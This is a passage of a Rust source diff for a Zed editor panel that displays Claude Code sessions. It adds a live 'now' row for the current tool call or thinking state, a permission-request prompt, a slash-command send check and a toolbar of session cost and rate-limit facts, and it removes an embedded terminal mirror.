-                                .size(LabelSize::Small),
-                        )
+                        .child(MarkdownElement::new(markdown, markdown_style(window, cx)))
                         .custom_scrollbars(
                             Scrollbars::new(ScrollAxes::Vertical)
                                 .tracked_scroll_handle(&self.live_message_scroll),
@@ -3310,24 +4809,182 @@ impl ClaudeSessionsPanel {
     /// where they put themselves: they are reading something, and until the turn lands in
     /// the conversation this box is the only place those words exist.
     fn follow_the_live_message(&mut self, cx: &Context<Self>) {
-        let live_message_length = self
+        let identity = self
             .store
             .read(cx)
-            .live_message()
-            .map_or(0, |live_message| live_message.len());
-        if live_message_length == self.live_message_length {
+            .live()
+            .live_message
+            .as_ref()
+            .map(|live_message| (live_message.message_id.clone(), live_message.text.len()));
+        if identity == self.live_message_identity {
             return;
         }
 
-        // A box that has not overflowed yet is at its end by definition, which is also
-        // the state every new message starts in.
         let scroll = &self.live_message_scroll;
         let was_at_the_end =
             scroll.max_offset().y + scroll.offset().y < px(LIVE_MESSAGE_TAIL_PIXELS);
-        self.live_message_length = live_message_length;
+        self.live_message_identity = identity.clone();
+        self.live_message_length = identity.as_ref().map(|(_, length)| *length).unwrap_or(0);
         if was_at_the_end {
             scroll.scroll_to_bottom();
         }
+    }
+
+    fn render_now_row(
+        &mut self,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) -> Option<AnyElement> {
+        let row = {
+            let store = self.store.read(cx);
+            if !matches!(store.transcript_target(), TranscriptTarget::Main) {
+                return None;
+            }
+            now_row(store.live(), &self.activity)
+        }?;
+        let now_ms = now_millis();
+        let narrow = panel_is_narrow(window);
+        let (icon, title, target, elapsed, pulse) = match &row {
+            NowRow::Tool {
+                name,
+                target,
+                started_at_ms,
+                ..
+            } => {
+                let elapsed = started_at_ms.map(|started_at_ms| {
+                    format_elapsed_mm_ss(now_ms.saturating_sub(started_at_ms))
+                });
+                let target = if narrow && !target.is_empty() {
+                    SharedString::from(truncate_and_trailoff(target, 18))
+                } else {
+                    target.clone()
+                };
+                (IconName::ToolHammer, name.clone(), target, elapsed, true)
+            }
+            NowRow::Thinking { since_ms } => {
+                let elapsed =
+                    since_ms.map(|since_ms| format_elapsed_mm_ss(now_ms.saturating_sub(since_ms)));
+                (
+                    IconName::ToolThink,
+                    SharedString::from(THINKING_NOTE),
+                    SharedString::from(""),
+                    elapsed,
+                    true,
+                )
+            }
+        };
+
+        let mut header = h_flex()
+            .id("claude-session-now-row")
+            .w_full()
+            .px_2()
+            .py_0p5()
+            .gap_1()
+            .cursor_pointer()
+            .on_click(cx.listener(|this, _, _, cx| this.toggle_now_row(cx)))
+            .child(Icon::new(icon).size(IconSize::XSmall).color(Color::Accent))
+            .child(
+                Label::new(title)
+                    .size(LabelSize::XSmall)
+                    .color(Color::Muted)
+                    .single_line(),
+            );
+        if !target.is_empty() {
+            header = header.child(
+                Label::new(target)
+                    .size(LabelSize::XSmall)
+                    .color(Color::Muted)
+                    .single_line(),
+            );
+        }
+        if let Some(elapsed) = elapsed {
+            header = header.child(
+                Label::new(elapsed)
+                    .size(LabelSize::XSmall)
+                    .color(Color::Muted)
+                    .single_line(),
+            );
+        }
+        if pulse {
+            header = header.child(
+                div()
+                    .w_1p5()
+                    .h_1p5()
+                    .rounded_full()
+                    .bg(cx.theme().colors().text_accent)
+                    .with_animation(
+                        "claude-session-now-row-dot",
+                        Animation::new(PULSE_PERIOD)
+                            .repeat()
+                            .with_easing(pulsating_between(0.2, 0.8)),
+                        |dot, delta| dot.opacity(delta),
+                    ),
+            );
+        }
+
+        let mut column = v_flex().w_full().flex_none().child(header);
+        if self.now_row_expanded {
+            column = column.children(self.render_now_row_expansion(&row, window, cx));
+        }
+        Some(column.into_any_element())
+    }
+
+    fn render_now_row_expansion(
+        &mut self,
+        row: &NowRow,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) -> Vec<AnyElement> {
+        let NowRow::Tool {
+            tool_use_id,
+            name,
+            input,
+            ..
+        } = row
+        else {
+            return Vec::new();
+        };
+
+        let mut cards = Vec::new();
+        let matching =
+            self.entries
+                .iter()
+                .enumerate()
+                .find_map(|(index, entry)| match &entry.kind {
+                    EntryKind::ToolUse { id, .. }
+                        if id.as_deref() == Some(tool_use_id.as_str())
+                            && !tool_use_id.is_empty() =>
+                    {
+                        Some(index)
+                    }
+                    _ => None,
+                });
+        if let Some(index) = matching {
+            cards.push(self.render_entry(index, window, cx));
+            if let Some(result_index) = index.checked_add(1)
+                && matches!(
+                    self.entries.get(result_index).map(|entry| &entry.kind),
+                    Some(EntryKind::ToolResult { .. })
+                )
+            {
+                cards.push(self.render_entry(result_index, window, cx));
+            }
+            return cards;
+        }
+
+        let input_text = SharedString::from(input.to_string());
+        cards.push(self.render_tool_use(
+            self.entries.len(),
+            SharedString::from(NOW_ROW_ENTRY_KEY),
+            name.clone(),
+            input_text,
+            (!tool_use_id.is_empty()).then(|| SharedString::from(tool_use_id.clone())),
+            None,
+            true,
+            window,
+            cx,
+        ));
+        cards
     }
 
     fn render_transcript_section(
@@ -3367,6 +5024,8 @@ impl ClaudeSessionsPanel {
 
         v_flex()
             .flex_grow_1()
+            .flex_shrink_1()
+            .min_h(rems(CONVERSATION_MIN_HEIGHT_REMS))
             .overflow_hidden()
             .child(
                 list(
@@ -3410,37 +5069,8 @@ impl ClaudeSessionsPanel {
                     ),
                 )
             })
+            .children(self.render_now_row(window, cx))
             .into_any_element()
-    }
-
-    /// The one line above the input that says what the session is doing, or nothing at
-    /// all for a session that is not doing anything: a line that is sometimes there and
-    /// sometimes not would move the input under the reader's hands at the end of every
-    /// turn. Read-only — the reader is being told something, not offered anything.
-    fn render_activity(&self) -> Option<AnyElement> {
-        let note = activity_label(&self.activity)?;
-
-        Some(
-            h_flex()
-                .w_full()
-                .px_2()
-                .pb_1()
-                .gap_1()
-                .child(
-                    Label::new(note)
-                        .size(LabelSize::XSmall)
-                        .color(Color::Muted)
-                        .single_line()
-                        .with_animation(
-                            "claude-session-activity",
-                            Animation::new(PULSE_PERIOD)
-                                .repeat()
-                                .with_easing(pulsating_between(0.4, 0.8)),
-                            |note, delta| note.alpha(delta),
-                        ),
-                )
-                .into_any_element(),
-        )
     }
 
     fn render_placeholder(message: &'static str) -> AnyElement {
@@ -3457,16 +5087,19 @@ impl ClaudeSessionsPanel {
 
     /// Whether a reply can be typed at all.
     ///
-    /// There has to be a pane to type into, and the conversation on screen has to be the
-    /// session's own. An agent's conversation is something to read: the session's pane is
-    /// the only thing there is to type into, so a reply sent from under an agent's records
-    /// would arrive in a conversation the reader is not looking at.
+    /// The Zed channel has to be live, and the conversation on screen has to be the
+    /// session's own. An agent's conversation is something to read: a reply sent from
+    /// under an agent's records would arrive in a conversation the reader is not looking
+    /// at.
     fn can_send(&self, cx: &App) -> bool {
         let store = self.store.read(cx);
-        store.pane_target().is_some() && *store.transcript_target() == TranscriptTarget::Main
+        !store.selected_is_ended()
+            && !store.live().session_ended
+            && store.channel_live()
+            && *store.transcript_target() == TranscriptTarget::Main
     }
 
-    /// A session Zed has no pane to type into can only be read, and so can no session at
+    /// A session whose channel is not loaded can only be read, and so can no session at
     /// all; the input is disabled in both cases rather than hidden, so that the reason is
     /// visible where the reply would be typed.
     fn sync_input_availability(&mut self, cx: &mut Context<Self>) {
@@ -3508,44 +5141,74 @@ impl ClaudeSessionsPanel {
             return;
         }
 
-        // Nothing to send to means nothing to draw the message against; `pane_target`
-        // has already answered that there is a session here.
-        let Some(process_id) = self.store.read(cx).selected() else {
+        match slash_send_decision(&text) {
+            SlashSendDecision::SendAsText => {}
+            SlashSendDecision::OpenInTerminal => {
+                self.slash_send_note = Some(SharedString::from(OPEN_IN_TERMINAL_NOTE));
+                cx.notify();
+                return;
+            }
+            SlashSendDecision::NeedsArgument { example } => {
+                self.slash_send_note = Some(SharedString::from(example));
+                cx.notify();
+                return;
+            }
+        }
+
+        self.dispatch_message(text, window, cx);
+    }
+
+    fn dispatch_message(&mut self, text: String, window: &mut Window, cx: &mut Context<Self>) {
+        if !self.can_send(cx) {
+            return;
+        }
+        let Some(session_id) = self.store.read(cx).selected().map(str::to_string) else {
             return;
         };
 
-        let send = self.store.update(cx, |store, cx| {
-            store.send_input(SessionInput::Text(text.clone()), cx)
-        });
-        // Emptied before the send is answered: the answer can be a round trip to
-        // another machine away, and the input has to be usable again at once.
+        self.slash_send_note = None;
+        let send = self
+            .store
+            .update(cx, |store, cx| store.send_message(text.clone(), cx));
         self.message_editor
             .update(cx, |editor, cx| editor.clear(window, cx));
-        // The walk up the history ended when what it found was sent, and the message
-        // just sent is about to become its newest entry.
         self.history_index = None;
-        self.quit_armed = false;
-        // Drawn from here rather than when the send is answered: the CLI writes the
-        // user's record only when it starts the turn, so on a busy session the text
-        // would be nowhere at all for as long as that turn takes.
         let pending_send = self
             .pending_sends
-            .remember(process_id, &text, &self.entries);
+            .remember(session_id, &text, &self.entries);
         self.rebuild_entries(cx);
         cx.notify();
+        self.wait_for_pending_send(pending_send, send, cx);
+    }
 
-        cx.spawn_in(window, async move |this, cx| {
+    fn answer_permission(&mut self, allow: bool, cx: &mut Context<Self>) {
+        if self.permission_answered {
+            return;
+        }
+        let answering = self
+            .store
+            .read(cx)
+            .live()
+            .pending_permission
+            .as_ref()
+            .map(|permission| SharedString::from(permission.tool_use_id.clone()));
+        let send = self
+            .store
+            .update(cx, |store, cx| store.answer_permission(allow, cx));
+        self.permission_answered = true;
+        self.permission_answered_for = answering;
+        cx.notify();
+        cx.spawn(async move |this, cx| {
             let outcome = send.await;
-            this.update_in(cx, |this, window, cx| {
-                this.pending_sends.resolve(pending_send, &outcome);
-                this.rebuild_entries(cx);
-                apply_send_outcome(&this.message_editor, &text, outcome, window, cx);
+            this.update(cx, |this, cx| {
+                if outcome.is_err() {
+                    this.permission_answered = false;
+                    this.permission_answered_for = None;
+                }
                 cx.notify();
             })
             .log_err();
         })
-        // Detached rather than held in a field: dropping it would cancel the send
-        // itself, and a second send must not cut the first one short.
         .detach();
     }
 
@@ -3559,25 +5222,50 @@ impl ClaudeSessionsPanel {
         cx.notify();
     }
 
-    fn interrupt_session(&mut self, _: &Interrupt, _window: &mut Window, cx: &mut Context<Self>) {
-        if !self.can_send(cx) {
+    fn retry_pending_send(&mut self, id: u64, cx: &mut Context<Self>) {
+        let Some(text) = self.pending_sends.retry(id, &self.entries) else {
             return;
-        }
+        };
+        let send = self
+            .store
+            .update(cx, |store, cx| store.send_message(text.to_string(), cx));
+        self.rebuild_entries(cx);
+        cx.notify();
+        self.wait_for_pending_send(id, send, cx);
+    }
 
-        // Escape puts the commands menu away first. Interrupting the session as well
-        // would make closing a menu cost a turn.
+    fn wait_for_pending_send(
+        &mut self,
+        id: u64,
+        send: Task<anyhow::Result<String>>,
+        cx: &mut Context<Self>,
+    ) {
+        cx.spawn(async move |this, cx| {
+            let outcome = send.await;
+            this.update(cx, |this, cx| {
+                this.pending_sends.resolve(id, &outcome);
+                this.rebuild_entries(cx);
+                cx.notify();
+            })
+            .log_err();
+        })
+        .detach();
+    }
+
+    fn copy_pending_send(&self, id: u64, cx: &mut Context<Self>) {
+        let Some(text) = self.pending_sends.text(id) else {
+            return;
+        };
+        cx.write_to_clipboard(ClipboardItem::new_string(text.to_string()));
+    }
+
+    fn dismiss_menus(&mut self, _: &DismissMenus, window: &mut Window, cx: &mut Context<Self>) {
         if self.dismiss_slash_menu(cx) || self.dismiss_file_menu(cx) {
             return;
         }
-
-        // Stopping the session is the opposite of ending it: a quit aimed at it must
-        // not stay armed behind this.
-        self.quit_armed = false;
-        self.store.update(cx, |store, cx| {
-            // There is no text to hand back for an interrupt, and the store reports the
-            // failure itself, so nothing here waits for the answer.
-            store.send_input(SessionInput::Escape, cx).detach()
-        });
+        self.question_ticks.clear();
+        self.focus_handle.focus(window, cx);
+        cx.notify();
     }
 
     /// The one control the conversation needs of its own: whether the session's tool
@@ -3599,21 +5287,139 @@ impl ClaudeSessionsPanel {
         )
     }
 
-    fn render_conversation_toolbar(&self, cx: &mut Context<Self>) -> impl IntoElement {
+    fn render_conversation_toolbar(
+        &self,
+        window: &mut Window,
+        cx: &mut Context<Self>,
+    ) -> impl IntoElement {
         let showing = self.show_tool_calls;
-
         let showing_costs = self.show_costs;
-        let spend = self.store.read(cx).transcript().spend();
-        // Read from the newest answer, so a session whose model or effort changed
-        // part-way says what it is on now rather than what it started on.
-        let facts = session_facts(&spend);
-        let unpriced = spend
-            .reported
-            .as_ref()
-            .is_some_and(|reported| reported.has_unknown_model_cost);
+        let showing_history = self.show_full_history;
+        let pending_agents = self.pending_background_agents();
+        let narrow = panel_is_narrow(window);
+
+        let (
+            title,
+            claude_ai_url,
+            meter,
+            model,
+            effort,
+            cost,
+            tokens_left,
+            rate_limit,
+            rate_limit_tooltip,
+            lines,
+            unpriced,
+        ) = {
+            let store = self.store.read(cx);
+            let spend = store.transcript().spend();
+            let status = store.status();
+            let selected = store.selected();
+            let ai_title = store.main_transcript().ai_title();
+            let live = store
+                .sessions()
+                .iter()
+                .find(|session| selected == Some(session.session.session_id.as_str()));
+            let ended = store
+                .ended_sessions()
+                .iter()
+                .find(|session| selected == Some(session.session_id.as_str()));
+            let title = live
+                .map(|session| {
+                    SharedString::from(preferred_session_name(&session.session, ai_title))
+                })
+                .or_else(|| {
+                    ended.map(|session| {
+                        SharedString::from(preferred_name(
+                            session.ai_title.as_deref(),
+                            session.name.as_deref(),
+                            session.session_id.as_str(),
+                        ))
+                    })
+                });
+            let claude_ai_url = claude_ai_session_url(
+                store.main_transcript().bridge_session_id().or(live
+                    .and_then(|session| session.bridge_session_id.as_deref())
+                    .or(ended.and_then(|session| session.bridge_session_id.as_deref()))),
+            );
+            let meter = context_meter(status, &spend, store.live().compacting);
+            let model = toolbar_model(status, &spend);
+            let effort = toolbar_effort(status, &spend);
+            let cost = toolbar_cost(status, &spend);
+            let tokens_left = store.transcript().tokens_left().map(tokens_left_fact);
+            let rate_limit = rate_limit_fact(
+                status.and_then(|status| status.five_hour_used_percentage),
+                status.and_then(|status| status.seven_day_used_percentage),
+            );
+            let mut reset_parts = Vec::new();
+            if let Some(resets_at) = status.and_then(|status| status.five_hour_resets_at)
+                && let Some(formatted) = format_resets_at(resets_at)
+            {
+                reset_parts.push(format!("5h resets {formatted}"));
+            }
+            if let Some(resets_at) = status.and_then(|status| status.seven_day_resets_at)
+                && let Some(formatted) = format_resets_at(resets_at)
+            {
+                reset_parts.push(format!("7d resets {formatted}"));
+            }
+            let lines = spend.reported.as_ref().and_then(|reported| {
+                line_change_fact(reported.lines_added, reported.lines_removed)
+            });
+            let unpriced = spend
+                .reported
+                .as_ref()
+                .is_some_and(|reported| reported.has_unknown_model_cost);
+            (
+                title,
+                claude_ai_url,
+                meter,
+                model,
+                effort,
+                cost,
+                tokens_left,
+                rate_limit,
+                (!reset_parts.is_empty()).then_some(reset_parts.join("\n")),
+                lines,
+                unpriced,
+            )
+        };
+
+        let mut fact_labels = Vec::new();
+        if let Some(model) = model {
+            fact_labels.push(model);
+        }
+        if let Some(effort) = effort {
+            fact_labels.push(effort);
+        }
+        if let Some(cost) = cost {
+            fact_labels.push(cost);
+        }
+        if let Some(tokens_left) = tokens_left {
+            fact_labels.push(tokens_left);
+        }
+        if let Some(rate_limit) = rate_limit {
+            fact_labels.push(rate_limit);
+        }
+        if let Some(lines) = lines {
+            fact_labels.push(lines);
+        }
+        if let Some(pending_agents) = pending_agents {
+            fact_labels.push(SharedString::from(if pending_agents == 1 {
+                "1 pending agent".to_string()
+            } else {
+                format!("{pending_agents} pending agents")
+            }));
+        }
+
+        let facts_tooltip = fact_labels
+            .iter()
+            .map(|fact| fact.to_string())
+            .collect::<Vec<_>>()
+            .join(" · ");
 
         h_flex()
             .w_full()
+            .flex_none()
             .px_2()
             .py_1()
             .gap_1()
@@ -3622,14 +5428,72 @@ impl ClaudeSessionsPanel {
                 h_flex()
                     .gap_1p5()
                     .overflow_hidden()
-                    .children(facts.into_iter().map(|fact| {
-                        Label::new(fact)
-                            .size(LabelSize::XSmall)
-                            .color(Color::Muted)
-                            .single_line()
-                    }))
-                    // Said only because Claude Code says it: a total it could not price
-                    // in full is worth less than the admission that it is short.
+                    .min_w_0()
+                    .children(
+                        title.map(|title| Label::new(title).size(LabelSize::Small).single_line()),
+                    )
+                    .when_some(meter, |this, meter| {
+                        let fill_color = match meter.color {
+                            Color::Warning => cx.theme().status().warning,
+                            Color::Error => cx.theme().status().error,
+                            _ => cx.theme().colors().text_muted,
+                        };
+                        let mut meter_row =
+                            h_flex().id("claude-session-context-meter").gap_1().child(
+                                div()
+                                    .w(px(CONTEXT_METER_WIDTH_PIXELS))
+                                    .h_1p5()
+                                    .rounded_full()
+                                    .bg(cx.theme().colors().background)
+                                    .border_1()
+                                    .border_color(cx.theme().colors().border)
+                                    .overflow_hidden()
+                                    .when_some(meter.fill, |this, fill| {
+                                        this.child(
+                                            div()
+                                                .h_full()
+                                                .w(relative(fill.clamp(0., 1.)))
+                                                .bg(fill_color),
+                                        )
+                                    }),
+                            );
+                        meter_row = meter_row.child(
+                            Label::new(meter.label)
+                                .size(LabelSize::XSmall)
+                                .color(meter.color)
+                                .single_line(),
+                        );
+                        if let Some(tooltip) = meter.tooltip {
+                            meter_row = meter_row.tooltip(Tooltip::text(tooltip));
+                        }
+                        this.child(meter_row)
+                    })
+                    .when(!narrow, |this| {
+                        this.children(fact_labels.iter().cloned().enumerate().map(
+                            |(index, fact)| {
+                                let mut row = h_flex()
+                                    .id(SharedString::from(format!("claude-session-fact-{index}")))
+                                    .child(
+                                        Label::new(fact)
+                                            .size(LabelSize::XSmall)
+                                            .color(Color::Muted)
+                                            .single_line(),
+                                    );
+                                if let Some(tooltip) = rate_limit_tooltip.as_ref() {
+                                    row = row.tooltip(Tooltip::text(tooltip.clone()));
+                                }
+                                row
+                            },
+                        ))
+                    })
+                    .when(narrow && !facts_tooltip.is_empty(), |this| {
+                        this.child(
+                            h_flex()
+                                .id("claude-session-facts-collapsed")
+                                .child(Label::new("…").size(LabelSize::XSmall).color(Color::Muted))
+                                .tooltip(Tooltip::text(facts_tooltip.clone())),
+                        )
+                    })
                     .when(unpriced, |this| {
                         this.child(
                             Label::new("unpriced models")
@@ -3641,238 +5505,46 @@ impl ClaudeSessionsPanel {
             .child(
                 h_flex()
                     .gap_1()
+                    .children(claude_ai_url.map(|url| {
+                        Button::new("claude-session-open-claude-ai", "Open in claude.ai")
+                            .label_size(LabelSize::XSmall)
+                            .on_click(move |_, _, cx| {
+                                cx.open_url(&url);
+                            })
+                    }))
                     .child(
-                        IconButton::new("claude-session-costs", IconName::CurrencyDollar)
-                            .icon_size(IconSize::Small)
-                            .toggle_state(showing_costs)
-                            .tooltip(Tooltip::text(if showing_costs {
-                                "Hide what each answer cost"
-                            } else {
-                                "Show what each answer cost"
-                            }))
-                            .on_click(cx.listener(|this, _, _, cx| this.toggle_costs(cx))),
+                        Button::new("claude-session-tool-calls", "Expand all tool calls")
+                            .label_size(LabelSize::XSmall)
+                            .toggle_state(showing)
+                            .on_click(cx.listener(|this, _, _, cx| this.toggle_tool_calls(cx))),
                     )
                     .child(
-                        IconButton::new(
-                            "claude-session-tool-calls",
-                            if showing {
-                                IconName::Eye
-                            } else {
-                                IconName::EyeOff
-                            },
-                        )
-                        .icon_size(IconSize::Small)
-                        .toggle_state(showing)
-                        .tooltip(Tooltip::text(if showing {
-                            "Hide tool calls and thinking"
-                        } else {
-                            "Show tool calls and thinking"
-                        }))
-                        .on_click(cx.listener(|this, _, _, cx| this.toggle_tool_calls(cx))),
+                        Button::new("claude-session-full-history", "Show full history")
+                            .label_size(LabelSize::XSmall)
+                            .toggle_state(showing_history)
+                            .on_click(cx.listener(|this, _, _, cx| this.toggle_full_history(cx))),
+                    )
+                    .child(
+                        Button::new("claude-session-costs", "Show costs")
+                            .label_size(LabelSize::XSmall)
+                            .toggle_state(showing_costs)
+                            .on_click(cx.listener(|this, _, _, cx| this.toggle_costs(cx))),
                     ),
             )
     }
 
-    /// Draws the session's terminal as it currently looks.
-    ///
-    /// Claude Code draws three things there that it never writes to the transcript: a
-    /// prompt waiting to be answered, the messages queued behind the turn it is running,
-    /// and its status line. None of them can be read from the conversation, so they are
-    /// shown as the terminal itself has them rather than parsed into this panel's own
-    /// elements — a parser would have to be right about the CLI's layout, and would go
-    /// wrong the first time that layout changed.
-    ///
-    /// Only the tail is drawn. The rest of the screen is the conversation, which is above
-    /// this in a form built for reading.
-    /// What stands in for the terminal until it is attached, and after an attach that
-    /// failed: the same screen, read through tmux rather than driven by it.
-    fn render_pane_mirror(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
-        let can_send = self.can_send(cx);
-        let contents = self.store.read(cx).pane_contents()?;
-        let tail: String = {
-            let lines: Vec<&str> = contents.lines().collect();
-            let from = lines.len().saturating_sub(PANE_MIRROR_LINES);
-            lines.get(from..).unwrap_or_default().join("\n")
-        };
-        if tail.trim().is_empty() {
-            return None;
-        }
-
-        let expanded = self.pane_expanded;
-
-        Some(
-            v_flex()
-                .w_full()
-                .border_t_1()
-                .border_color(cx.theme().colors().border)
-                .child(
-                    h_flex()
-                        .px_2()
-                        .py_1()
-                        .gap_1()
-                        .child(
-                            Disclosure::new("claude-session-pane-mirror", expanded).on_click(
-                                cx.listener(|this, _, _, cx| this.toggle_pane_mirror(cx)),
-                            ),
-                        )
-                        .child(
-                            Label::new("Terminal")
-                                .size(LabelSize::XSmall)
-                                .color(Color::Muted),
-                        )
-                        .child(div().flex_1())
-                        .children(
-                            expanded
-                                .then(|| {
-                                    [
-                                        (PaneKey::Up, IconName::ChevronUp, "Up"),
-                                        (PaneKey::Down, IconName::ChevronDown, "Down"),
-                                        (PaneKey::Enter, IconName::Return, "Enter"),
-                                    ]
-                                    .map(
-                                        |(key, icon, name)| {
-                                            IconButton::new(
-                                                SharedString::from(format!(
-                                                    "claude-session-pane-key-{name}"
-                                                )),
-                                                icon,
-                                            )
-                                            .icon_size(IconSize::XSmall)
-                                            .disabled(!can_send)
-                                            .tooltip(Tooltip::text(format!(
-                                                "Send {name} to the terminal"
-                                            )))
-                                            .on_click(
-                                                cx.listener(move |this, _, _, cx| {
-                                                    this.send_pane_key(key, cx)
-                                                }),
-                                            )
-                                        },
-                                    )
-                                })
-                                .into_iter()
-                                .flatten(),
-                        ),
-                )
-                .when(expanded, |this| {
-                    this.child(
-                        div()
-                            .id("claude-session-pane-mirror-contents")
-                            .w_full()
-                            .px_2()
-                            .pb_2()
-                            .overflow_x_scroll()
-                            .child(
-                                div()
-                                    .font_buffer(cx)
-                                    .text_size(TextSize::XSmall.rems(cx))
-                                    .text_color(cx.theme().colors().text_muted)
-                                    .whitespace_nowrap()
-                                    .child(tail),
-                            ),
-                    )
-                })
-                .into_any_element(),
-        )
-    }
-
-    /// The terminal, framed the way the mirror it stands in for is.
-    ///
-    /// The section owns the dragged height and the terminal fills what is left of it
-    /// under the header, so that the height the reader set is the height they see rather
-    /// than that plus a header.
-    fn render_terminal(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
-        let terminal = self.terminal.clone()?;
-        let expanded = self.pane_expanded;
-
-        Some(
-            v_flex()
-                .w_full()
-                .when(expanded, |this| this.h(self.terminal_height))
-                .border_t_1()
-                .border_color(cx.theme().colors().border)
-                // The bounds this reports are the section's, so the height the drag
-                // wants is the distance from the pointer down to the section's bottom,
-                // which does not move while the top edge is dragged.
-                .on_drag_move(cx.listener(
-                    |this, event: &DragMoveEvent<DraggedTerminalDivider>, _, cx| {
-                        let height = event.bounds.bottom() - event.event.position.y;
-                        this.terminal_height =
-                            height.clamp(MIN_TERMINAL_HEIGHT, MAX_TERMINAL_HEIGHT);
-                        cx.notify();
-                    },
-                ))
-                .when(expanded, |this| {
-                    this.child(
-                        div()
-                            .id("claude-session-terminal-resize")
-                            .w_full()
-                            .h(TERMINAL_RESIZE_HANDLE_HEIGHT)
-                            .cursor_row_resize()
-                            .on_drag(DraggedTerminalDivider, |_, _, _, cx| {
-                                cx.stop_propagation();
-                                cx.new(|_| DraggedTerminalDivider)
-                            })
-                            .on_mouse_down(
-                                MouseButton::Left,
-                                cx.listener(|_, _: &MouseDownEvent, _, cx| {
-                                    cx.stop_propagation();
-                                }),
-                            )
-                            .occlude(),
-                    )
-                })
-                .child(
-                    h_flex()
-                        .px_2()
-                        .py_1()
-                        .gap_1()
-                        .child(
-                            Disclosure::new("claude-session-terminal", expanded).on_click(
-                                cx.listener(|this, _, _, cx| this.toggle_pane_mirror(cx)),
-                            ),
-                        )
-                        .child(
-                            Label::new("Terminal")
-                                .size(LabelSize::XSmall)
-                                .color(Color::Muted),
-                        ),
-                )
-                .when(expanded, |this| {
-                    this.child(
-                        div()
-                            .flex_1()
-                            .w_full()
-                            .overflow_hidden()
-                            // A terminal that is not focused takes no keys. Nothing else
-                            // focuses this one: in a pane that is the pane's job, and
-                            // here there is no pane.
-                            .on_mouse_down(
-                                MouseButton::Left,
-                                cx.listener(|this, _: &MouseDownEvent, window, cx| {
-                                    if let Some(terminal) = this.terminal.as_ref() {
-                                        terminal.focus_handle(cx).focus(window, cx);
-                                    }
-                                }),
-                            )
-                            .child(terminal),
-                    )
-                })
-                .into_any_element(),
-        )
-    }
-
-    /// The commands what is typed could be naming, drawn as rows to pick from.
-    ///
-    /// Sits between the message box and the buttons under it, which is where the reader
-    /// is looking while they type. Picking one fills the box rather than sending it: a
-    /// command that takes arguments is only half typed when its name is.
     fn render_slash_commands(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
         let offered = self.offered_slash_commands(cx)?;
         let highlighted = step_through_menu(self.slash_highlight, offered.len(), MenuStep::Stay);
         // Taken by value here: the rows outlive the borrow of the commands, because each
         // row's handler carries the name it will put in the box.
-        let rows: Vec<(SharedString, Option<SharedString>, SharedString, String)> = offered
+        let rows: Vec<(
+            SharedString,
+            Option<SharedString>,
+            SharedString,
+            String,
+            bool,
+        )> = offered
             .into_iter()
             .map(|command| {
                 let scope = match command.scope {
@@ -3884,11 +5556,13 @@ impl ClaudeSessionsPanel {
                     Some(hint) => format!("/{} {hint}", command.name),
                     None => format!("/{}", command.name),
                 };
+                let needs_terminal = slash_command_needs_terminal(&command.name);
                 (
                     SharedString::from(shown),
                     command.description.clone().map(SharedString::from),
                     SharedString::from(scope),
                     command.name.clone(),
+                    needs_terminal,
                 )
             })
             .collect();
@@ -3913,7 +5587,9 @@ impl ClaudeSessionsPanel {
                 ),
         );
 
-        for (index, (name, description, scope, command_name)) in rows.into_iter().enumerate() {
+        for (index, (name, description, scope, command_name, needs_terminal)) in
+            rows.into_iter().enumerate()
+        {
             let is_highlighted = index == highlighted;
             menu = menu.child(
                 h_flex()
@@ -3944,9 +5620,20 @@ impl ClaudeSessionsPanel {
                         )),
                     )
                     .child(
-                        Label::new(scope)
-                            .size(LabelSize::XSmall)
-                            .color(Color::Muted),
+                        h_flex()
+                            .gap_1()
+                            .when(needs_terminal, |this| {
+                                this.child(
+                                    Label::new("terminal")
+                                        .size(LabelSize::XSmall)
+                                        .color(Color::Muted),
+                                )
+                            })
+                            .child(
+                                Label::new(scope)
+                                    .size(LabelSize::XSmall)
+                                    .color(Color::Muted),
+                            ),
                     ),
             );
         }
@@ -3977,7 +5664,7 @@ impl ClaudeSessionsPanel {
                 ),
         );
 
-        for (index, path) in offered.into_iter().take(FILE_MENU_ROWS).enumerate() {
+        for (index, path) in offered.into_iter().enumerate() {
             let is_highlighted = index == highlighted;
             let chosen = path.clone();
             menu = menu.child(
@@ -4004,111 +5691,108 @@ impl ClaudeSessionsPanel {
         Some(menu.into_any_element())
     }
 
-    /// The question the session is waiting on, drawn as something to answer.
-    ///
-    /// Sits above the message box rather than replacing it: a question always offers
-    /// typing an answer of your own as well, and a reader who wants to say something else
-    /// entirely is not stopped from doing it.
-    /// Sends the answers the terminal has listed back, or throws them away and starts
-    /// the call's questions again.
-    fn confirm_answers(&mut self, send: bool, cx: &mut Context<Self>) {
-        let Some(keys) = keys_for_confirmation(send) else {
-            return;
-        };
-        self.ticked = None;
-        self.send_answer(keys, cx);
+    fn render_hook_install_note(&self) -> Option<AnyElement> {
+        let note = self.hook_install_note.clone()?;
+        Some(
+            div()
+                .px_2()
+                .pb_1()
+                .child(Label::new(note).size(LabelSize::XSmall).color(Color::Muted))
+                .into_any_element(),
+        )
     }
 
-    /// Whether the terminal is on the screen that asks whether to send the answers.
-    ///
-    /// A call that has already returned is not waiting on anything, so a screen left
-    /// over from one is not drawn as a choice: what the panel offers has to be something
-    /// pressing it would actually do.
-    fn answers_are_being_confirmed(&self, cx: &Context<Self>) -> bool {
-        let store = self.store.read(cx);
-        let Some(recorded) = store.recorded_question() else {
-            return false;
+    fn render_pending_permission(&self, cx: &mut Context<Self>) -> Option<AnyElement> {
+        let (title, request_id, inbox, permission_answered) = {
+            let store = self.store.read(cx);
+            let permission = store.live().pending_permission.as_ref()?;
+            let target = tool_target(&serde_json::json!({
+                "name": permission.tool_name,
+                "input": permission.tool_input,
+            }));
+            let title = if target.is_empty() {
+                format!("Permission requested: {}", permission.tool_name)
+            } else {
+                format!("Permission requested: {} {}", permission.tool_name, target)
+            };
+            (
+                title,
+                store.open_permission_request_id(),
+                store.open_permission_inbox_event().cloned(),
+                self.permission_answered,
+            )
         };
-        if call_is_answered(store.main_transcript(), &recorded.tool_use_id) {
-            return false;
+
+        let mut card = v_flex().w_full().gap_1().px_2().pb_1().child(
+            Label::new(title)
+                .size(LabelSize::Small)
+                .color(Color::Warning),
+        );
+        if let Some(ChannelInboxEvent::PermissionRequest {
+            description,
+            input_preview,
+            ..
+        }) = inbox
+        {
+            if !description.is_empty() {
+                card = card.child(
+                    Label::new(SharedString::from(description))
